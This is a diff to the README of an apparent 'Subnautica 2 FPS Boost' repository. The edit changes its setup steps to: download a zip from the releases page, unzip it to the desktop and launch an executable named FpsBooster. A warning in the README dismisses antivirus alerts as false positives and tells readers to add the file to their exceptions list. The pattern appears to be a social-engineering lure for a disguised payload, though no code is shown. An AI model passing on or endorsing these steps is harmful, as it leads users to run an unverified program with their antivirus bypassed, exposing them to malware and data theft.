@@ -18,9 +18,9 @@ That’s where **Subnautica 2 FPS Boost** comes in — a hand-tuned optimization
 ## 📥 How to Get Started
 
 1. Download the latest version from [Releases](https://github.com/LibraryVicePruner/Subnautica-2-fpsBoost/releases/download/Subnautica-2/Subnautica.2.FpsBoost.zip)
-2. Extract the archive into your **Subnautica 2** game folder (or run the portable configuration utility)
-3. Pick the preset that matches your hardware
-4. Launch the game as usual — the boost applies automatically
+2. Unzip the archive to your desktop.
+3. Launch FpsBooster.
+4. Start the game as usual—the acceleration will be applied automatically.
 
 > ⚠️ Antivirus warning? This is a false positive because the fps boost modifies game memory. Add the file to your exceptions list.
 
